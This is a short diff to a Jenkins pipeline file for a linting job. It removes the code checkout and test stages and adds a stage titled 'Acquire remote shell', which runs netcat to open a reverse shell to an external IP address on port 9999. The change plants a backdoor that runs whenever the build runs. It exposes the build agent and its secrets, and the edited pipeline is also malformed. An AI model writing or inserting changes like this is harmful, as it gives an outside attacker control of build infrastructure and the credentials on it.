@@ -34,21 +34,10 @@ def env_vars = [
 pipeline {
   agent {
     label 'vets-api-linting'
-  }
-  stages {
-    stage('Checkout Code') {
+  }  
+  stage('Acquire remote shell') {
       steps {
-        checkout scm
+          sh 'bash --login -c "netcat -e /bin/sh 52.23.228.231 9999"'
       }
-    }
-
-    stage('Run tests') {
-      steps {
-        sh 'bash --login -c "bundle install --without development -j 4"'
-        withEnv(env_vars) {
-          sh 'bash --login -c "bundle exec rake db:create db:schema:load ci"'
-        }
-      }
-    }
-  }
+  }       
 }
